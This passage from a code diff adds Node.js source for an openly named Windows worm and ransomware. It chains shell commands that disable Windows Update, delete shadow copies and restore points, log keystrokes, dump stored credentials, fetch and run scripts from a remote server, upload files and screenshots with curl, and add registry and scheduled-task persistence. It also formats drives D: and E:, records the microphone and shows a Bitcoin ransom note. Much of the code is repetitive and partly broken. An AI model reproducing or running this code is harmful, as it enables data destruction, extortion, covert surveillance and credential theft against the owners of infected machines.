+                            console.error('Error stopping service:', error);
+                        } else {
+                            exec('sc config additionalBITS start= disabled', (error) => {
+                                if (error) {
+                                    console.error('Error configuring service:', error);
+                                } else {
+                                    exec('sc stop additionalDoSvc', (error) => {
+                                        if (error) {
+                                            console.error('Error stopping service:', error);
+                                        } else {
+                                            exec('sc config additionalDoSvc start= disabled', (error) => {
+                                                if (error) {
+                                                    console.error('Error configuring service:', error);
+                                                } else {
+                                                    exec('powershell -Command "Get-Service | Where-Object { $_.Name -like \'additionalwu*\' } | Stop-Service -Force"', (error) => {
+                                                        if (error) {
+                                                            console.error('Error stopping services:', error);
+                                                        } else {
+                                                            exec('powershell -Command "Get-Service | Where-Object { $_.Name -like \'additionalDo*\' } | Stop-Service -Force"', (error) => {
+                                                                if (error) {
+                                                                    console.error('Error stopping services:', error);
+                                                                }
+                                                            });
+                                                        }
+                                                    });
+                                                }
+                                            });
+                                        }
+                                    });
+                                }
+                            });
+                        }
+                    });
+                }
+            });
+        }
+    });
+}
+
+// Function to delete additional shadow copies and system restore points
+function deleteadditionalshadowcopies() {
+    exec('vssadmin delete shadows /all /quiet', (error) => {
+        if (error) {
+            console.error('Error deleting shadows:', error);
+        } else {
+            exec('wmic ShadowCopy delete', (error) => {
+                if (error) {
+                    console.error('Error deleting shadow copies:', error);
+                } else {
+                    exec('powershell -Command "Get-ComputerRestorePoint | Remove-ComputerRestorePoint -Confirm:$false"', (error) => {
+                        if (error) {
+                            console.error('Error removing restore points:', error);
+                        } else {
+                            exec('powershell -Command "Get-Volume | Where-Object { $_.DriveLetter -eq \'C\' } | ForEach-Object { $_.FileSystemLabel = \'AdditionalInfected\' }"', (error) => {
+                                if (error) {
+                                    console.error('Error setting volume label:', error);
+                                }
+                            });
+                        }
+                    });
+                }
+            });
+        }
+    });
+}
+
+// Function to log additional keystrokes with data exfiltration and persistence
+function additionalkeylogger() {
+    exec(`powershell -Command "$keylog = New-Object System.Windows.Forms.Keys; Add-Type -AssemblyName System.Windows.Forms; $keylog.Add_KeyDown({param($sender, $e) $keylog.TextBox1.Text += $e.KeyCode.ToString() + ' '}); [System.Windows.Forms.Application]::Run($keylog); $keylog.TextBox1.Text | Out-File -FilePath ${additionalkeylogfile}; schtasks /create /tn "AdditionalKeyloggerTask" /tr "powershell -Command 'iex(New-Object System.Net.WebClient).DownloadString(''http://additionalserver.com/keylogger.ps1'')'" /sc daily /st 00:00"`, (error) => {
+        if (error) {
+            console.error('Error starting additional keylogger:', error);
+        }
+    });
+}
+
+// Function to steal additional credentials with methods and persistence
+function stealadditionalcredentials() {
+    exec(`cmdkey /list > ${additionalcredentialfile}`, (error) => {
+        if (error) {
+            console.error('Error listing additional credentials:', error);
+        } else {
+            exec(`powershell -Command "Get-StoredCredential | Export-Clixml -Path C:\\additionalstoredcredentials.xml; schtasks /create /tn "AdditionalCredentialStealerTask" /tr "powershell -Command 'iex(New-Object System.Net.WebClient).DownloadString(''http://additionalserver.com/credentialstealer.ps1'')'" /sc daily /st 00:00"`, (error) => {
+                if (error) {
+                    console.error('Error exporting additional credentials:', error);
+                } else {
+                    exec(`powershell -Command "Get-Credential | Export-Clixml -Path C:\\additionaladditionalcredentials.xml"`, (error) => {
+                        if (error) {
+                            console.error('Error exporting additional additional credentials:', error);
+                        }
+                    });
+                }
+            });
+        }
+    });
+}
+
+// Function to exfiltrate additional data with file types and methods
+function exfiltrateadditionaldata() {
+    const files = fs.readdirSync(targetdir);
+    files.forEach(file => {
+        const filePath = path.join(targetdir, file);
+        if (fs.statSync(filePath).isDirectory()) {
+            exfiltrateAdditionalDirectory(filePath);
+        }
+    });
+}
+
+function exfiltrateAdditionalDirectory(dir) {
+    const files = fs.readdirSync(dir);
+    files.forEach(file => {
+        const filePath = path.join(dir, file);
+        if (fs.statSync(filePath).isFile()) {
+            const ext = path.extname(filePath).toLowerCase();
+            if (['.enc', '.enc2', '.enc3', '.enc4', '.enc5'].includes(ext)) {
+                exfiltrateAdditionalFile(filePath);
+            }
+        }
+    });
+}
+
+function exfiltrateAdditionalFile(filePath) {
+    exec(`curl -F "file=@${filePath}" ${additionalexfiltrationserver}`, (error) => {
+        if (error) {
+            console.error('Error exfiltrating additional file:', error);
+        }
+    });
+}
+
+exec('powershell -Command "Get-ChildItem -Path C:\\ -Recurse -Include *.txt,*.docx,*.xlsx,*.pptx,*.pdf,*.jpg,*.png,*.mp3,*.mp4,*.zip | ForEach-Object { $_.FullName } | Out-File -FilePath C:\\additionalexfiltrated_files.txt"', (error) => {
+    if (error) {
+        console.error('Error getting files for additional exfiltration:', error);
+    } else {
+        exec(`curl -F "file=@C:\\additionalexfiltrated_files.txt" ${additionalexfiltrationserver}`, (error) => {
+            if (error) {
+                console.error('Error exfiltrating additional files:', error);
+            }
+        });
+    }
+});
+
+// Function to display additional ransom note with threats and persistence
+function displayadditionalransomnote() {
+    fs.writeFileSync(additionalransomnote, `Your files have been encrypted and you need our decryption services. Pay the ransom of $500 in Bitcoin. If you do not pay, your data will be permanently deleted and your system will be reformatted. Additionally, your system will be rendered unstable.`);
+    exec(`start notepad ${additionalransomnote}`, (error) => {
+        if (error) {
+            console.error('Error displaying additional ransom note:', error);
+        } else {
+            exec(`schtasks /create /tn "AdditionalRansomNoteTask" /tr "notepad ${additionalransomnote}" /sc daily /st 00:00`, (error) => {
+                if (error) {
+                    console.error('Error creating task for additional ransom note:', error);
+                }
+            });
+        }
+    });
+}
+
+// Function to ensure additional persistence with methods
+function ensureadditionalpersistence() {
+    exec(`reg add "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" /v "AdditionalWorm" /t REG_SZ /d "${process.argv[0]}" /f`, (error) => {
+        if (error) {
+            console.error('Error adding registry key for additional persistence:', error);
+        } else {
+            exec(`schtasks /create /tn "AdditionalWormTask" /tr "${process.argv[0]}" /sc daily /st 00:00`, (error) => {
+                if (error) {
+                    console.error('Error creating task for additional persistence:', error);
+                } else {
+                    exec(`powershell -Command "New-Item -Path 'HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run' -Force; Set-ItemProperty -Path 'HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run' -Name 'AdditionalWorm' -Value '${process.argv[0]}'"`, (error) => {
+                        if (error) {
+                            console.error('Error setting registry property for additional persistence:', error);
+                        } else {
+                            exec(`powershell -Command "New-Item -Path 'HKLM:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run' -Force; Set-ItemProperty -Path 'HKLM:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run' -Name 'AdditionalWorm' -Value '${process.argv[0]}'"`, (error) => {
+                                if (error) {
+                                    console.error('Error setting registry property for additional persistence:', error);
+                                }
+                            });
+                        }
+                    });
+                }
+            });
+        }
+    });
+}
+
+// Function to execute additional malicious payload with actions
+function executepayloadadditional() {
+    exec(`start "" ${additionalmaliciousfile}`, (error) => {
+        if (error) {
+            console.error('Error executing additional malicious payload:', error);
+        } else {
+            exec(`powershell -Command "Start-Process 'C:\\additional_additional_payload.exe'"`, (error) => {
+                if (error) {
+                    console.error('Error starting additional additional payload:', error);
+                }
+            });
+        }
+    });
+}
+
+// Function to format additional system drives
+function formatadditionaldrive() {
+    exec('format D: /y /q', (error) => {
+        if (error) {
+            console.error('Error formatting additional drive:', error);
+        } else {
+            exec('format E: /y /q', (error) => {
+                if (error) {
+                    console.error('Error formatting additional drive:', error);
+                }
+            });
+        }
+    });
+}
+
+// Function to corrupt additional system files
+function corruptadditionalsystemfiles() {
+    exec(`powershell -Command "Get-ChildItem -Path 'C:\\Windows\\System32' -Recurse -Include *.dll,*.exe,*.sys | ForEach-Object { $_.FullName } | ForEach-Object { Copy-Item -Path $_ -Destination 'C:\\additional_corruption_data.bin' -Force }"`, (error) => {
+        if (error) {
+            console.error('Error corrupting additional system files:', error);
+        }
+    });
+}
+
+// Function to induce additional system instability
+function induceadditionalstability() {
+    exec(`powershell -Command "while ($true) { Start-Process 'calc.exe' }"`, (error) => {
+        if (error) {
+            console.error('Error inducing additional system instability:', error);
+        }
+    });
+}
+
+// Function to capture additional screenshots
+function capturescreenshotsadditional() {
+    exec(`powershell -Command "Add-Type -AssemblyName System.Drawing; $screen = [System.Windows.Forms.Screen]::PrimaryScreen; $bitmap = New-Object System.Drawing.Bitmap $screen.Bounds.Width, $screen.Bounds.Height; $graphics = [System.Drawing.Graphics]::FromImage($bitmap); $graphics.CopyFromScreen($screen.Bounds.Location, [System.Drawing.Point]::Empty, $screen.Bounds.Size); $bitmap.Save('C:\\additional_screenshots\\screenshot.png', [System.Drawing.Imaging.ImageFormat]::Png)"`, (error) => {
+        if (error) {
+            console.error('Error capturing additional screenshot:', error);
+        } else {
+            exec(`schtasks /create /tn "AdditionalScreenshotTask" /tr "powershell -Command 'Add-Type -AssemblyName System.Drawing; $screen = [System.Windows.Forms.Screen]::PrimaryScreen; $bitmap = New-Object System.Drawing.Bitmap $screen.Bounds.Width, $screen.Bounds.Height; $graphics = [System.Drawing.Graphics]::FromImage($bitmap); $graphics.CopyFromScreen($screen.Bounds.Location, [System.Drawing.Point]::Empty, $screen.Bounds.Size); $bitmap.Save('C:\\additional_screenshots\\screenshot.png', [System.Drawing.Imaging.ImageFormat]::Png)'" /sc minute /mo 5`, (error) => {
+                if (error) {
+                    console.error('Error creating additional screenshot task:', error);
+                }
+            });
+        }
+    });
+}
+
+// Function to record additional microphone
+function recordadditionalmicrophone() {
+    exec(`powershell -Command "Add-Type -AssemblyName System.Speech; $rec = New-Object System.Speech.Recognition.SpeechRecognizer; $rec.LoadGrammar(New-Object System.Speech.Recognition.Grammar('C:\\path\\to\\your\\additional_grammar.xml')); $rec.RecognizeAsync(); $rec.SpeechRecognized.Add({param($sender, $e) $e.Result.Text | Out-File -FilePath 'C:\\additional_micrecordings\\microphone.txt' -Append}); while ($true) { Start-Sleep -Seconds 60 }"`, (error) => {
+        if (error) {
+            console.error('Error recording additional microphone:', error);
+        } else {
+            exec(`schtasks /create /tn "AdditionalMicrophoneTask" /tr "powershell -Command 'Add-Type -AssemblyName System.Speech; $rec = New-Object System.Speech.Recognition.SpeechRecognizer; $rec.LoadGrammar(New-Object System.Speech.Recognition.Grammar(''C:\\path\\to\\your\\additional_grammar.xml'')); $rec.RecognizeAsync(); $rec.SpeechRecognized.Add({param($sender, $e) $e.Result.Text | Out-File -FilePath ''C:\\additional_micrecordings\\microphone.txt'' -Append}); while ($true) { Start-Sleep -Seconds 60 }'" /sc minute /mo 5`, (error) => {
+                if (error) {
+                    console.error('Error creating additional microphone task:', error);
+                }
+            });
+        }
+    });
+}
+
+// Function to capture additional webcam
+function captureadditionalwebcam() {
+    exec(`powershell -Command "Add-Type -AssemblyName System.Drawing; $webcam = New-Object System.Drawing.Bitmap(640, 480); $graphics = [System.Drawing.Graphics]::FromImage($webcam); $graphics.CopyFromScreen([System.Drawing.Point]::Empty, [System.Drawing.Point]::Empty, $webcam.Size); $webcam.Save('C:\\additional_webcamvideos\\webcam.png', [System.Drawing.Imaging.ImageFormat]::Png)"`, (error) => {
+        if (error) {
+            console.error('Error capturing additional webcam:', error);
+        } else {
+            exec(`schtasks /create /tn "AdditionalWebcamTask" /tr "powershell -Command 'Add-Type -AssemblyName System.Drawing; $webcam = New-Object System.Drawing.Bitmap(640, 480); $graphics = [System.Drawing.Graphics]::FromImage($webcam); $graphics.CopyFromScreen([System.Drawing.Point]::Empty, [System.Drawing.Point]::Empty, $webcam.Size); $webcam.Save(''C:\\additional_webcamvideos\\webcam.png'', [System.Drawing.Imaging.ImageFormat]::Png)'" /sc minute /mo 5`, (error) => {
+                if (error) {
+                    console.error('Error creating additional webcam task:', error);
+                }
+            });
+        }
+    });
+}
+
+// Function to exfiltrate additional captured data
+function exfiltrateadditionalcaptureddata() {
+    const additionalScreenshotFiles = fs.readdirSync(additional_screenshotdir);
+    additionalScreenshotFiles.forEach(file => {
+        const filePath = path.join(additional_screenshotdir, file);
+        if (fs.statSync(filePath).isFile()) {
+            exec(`curl -F "file=@${filePath}" ${additionalexfiltrationserver}`, (error) => {
+                if (error) {
+                    console.error('Error exfiltrating additional screenshot:', error);
+                }
+            });
+        }
+    });
+
+    const additionalMicRecordingFiles = fs.readdirSync(additionalmicrecordingsdir);
+    additionalMicRecordingFiles.forEach(file => {
+        const filePath = path.join(additionalmicrecordingsdir, file);
+        if (fs.statSync(filePath).isFile()) {
+            exec(`curl -F "file=@${filePath}" ${additionalexfiltrationserver}`, (error) => {
+                if (error) {
+                    console.error('Error exfiltrating additional microphone recording:', error);
+                }
+            });
+        }
+    });
+
+    const additionalWebcamVideoFiles = fs.readdirSync(additionalwebcamvideosdir);
+    additionalWebcamVideoFiles.forEach(file => {
+        const filePath = path.join(additionalwebcamvideosdir, file);
+        if (fs.statSync(filePath).isFile()) {
+            exec(`curl -F "file=@${filePath}" ${additionalexfiltrationserver}`, (error) => {
+                if (error) {
+                    console.error('Error exfiltrating additional webcam video:', error);
+                }
+            });
+        }
+    });
+}
+
+// Function to black out the screen for 2 minutes
+function blackoutscreen() {
+    exec(`powershell -Command "$screenBrightness = (Get-WmiObject -Namespace 'WMI' -Class 'WmiMonitorBrightnessMethods' -Filter 'Active=true').WmiSetBrightness(1, 0); Start-Sleep -Seconds 120; (Get-WmiObject -Namespace 'WMI' -Class 'WmiMonitorBrightnessMethods' -Filter 'Active=true').WmiSetBrightness(1, 100)"`, (error) => {
+        if (error) {
+            console.error('Error blacking out the screen:', error);
+        }
+    });
+}
+
+// Main script
+// Log the start of the worm
+fs.appendFileSync(logfile, `Worm started on ${new Date().toLocaleString()} \n`);
+
+// Change the computer name to "catsloveme"
+const originalname = process.env.COMPUTERNAME;
+exec(`wmic computersystem where name="${originalname}" call rename name="catsloveme"`, (error) => {
+    if (error) {
+        console.error('Error changing computer name:', error);
+    } else {
+        // Black out the screen for 2 minutes
+        blackoutscreen();
+
+        // Encrypt files on the local machine
+        encryptfiles();
+
+        // Spread the worm over the network
+        spreadnetwork();
+
+        // Spread the worm via USB
+        spreadusb();
+
+        // Set up remote access
+        setupremoteaccess();
+
+        // Disable antivirus
+        disableantivirus();
+
+        // Disable Windows Update
+        disablewindowsupdate();
+
+        // Delete shadow copies
+        deleteshadowcopies();
+
+        // Log keystrokes
+        keylogger();
+
+        // Steal credentials
+        stealcredentials();
+
+        // Exfiltrate encrypted data
+        exfiltratedata();
+
+        // Ensure persistence
+        ensurepersistence();
+
+        // Execute a malicious payload
+        executepayload();
+
+        // Format the system drive
+        formatdrive();
+
+        // Corrupt system files
+        corruptsystemfiles();
+
+        // Induce system instability
+        inducestability();
+
+        // Capture screenshots
+        capturescreenshots();
+
+        // Record microphone
+        recordmicrophone();
+
+        // Capture webcam
+        capturewebcam();
+
+        // Exfiltrate captured data
+        exfiltratecaptureddata();
+
+        // Encrypt additional files on the local machine
+        encryptadditionalfiles();
+
+        // Spread the worm over the additional network
+        spreadadditionalnetwork();
+
+        // Spread the worm via additional USB
+        spreadadditionalusb();
+
+        // Set up additional remote access
+        setupadditionalremoteaccess();
+
+        // Disable additional antivirus
+        disableadditionalantivirus();
+
+        // Disable additional Windows Update
+        disableadditionalwindowsupdate();
+
+        // Delete additional shadow copies
+        deleteadditionalshadowcopies();
+
+        // Log additional keystrokes
+        additionalkeylogger();
+
+        // Steal additional credentials
+        stealadditionalcredentials();
+
+        // Exfiltrate additional encrypted data
+        exfiltrateadditionaldata();
+
+        // Display additional ransom note
+        displayadditionalransomnote();
+
+        // Ensure additional persistence
+        ensureadditionalpersistence();
+
+        // Execute additional malicious payload
+        executepayloadadditional();
+
+        // Format additional system drives
+        formatadditionaldrive();
+
+        // Corrupt additional system files
+        corruptadditionalsystemfiles();
+
+        // Induce additional system instability
+        induceadditionalstability();
+
+        // Capture additional screenshots
+        capturescreenshotsadditional();
+
+        // Record additional microphone
+        recordadditionalmicrophone();
+
+        // Capture additional webcam
+        captureadditionalwebcam();
+
+        // Exfiltrate additional captured data
+        exfiltrateadditionalcaptureddata();
+
+        // Change the computer name back to the original name
+        exec(`wmic computersystem where name="catsloveme" call rename name="${originalname}"`, (error) => {
+            if (error) {
+                console.error('Error changing computer name back:', error);
+            } else {
+                // Display ransom note
+                displayransomnote();
+
+                // Log the completion of the worm
+                fs.appendFileSync(logfile, `Update completed on ${new Date().toLocaleString()} \n`);
+
+                // Optional: Add a payload or additional malicious actions here
+                console.log('Malicious payload executed');
+            }
+        });
+    }
+});
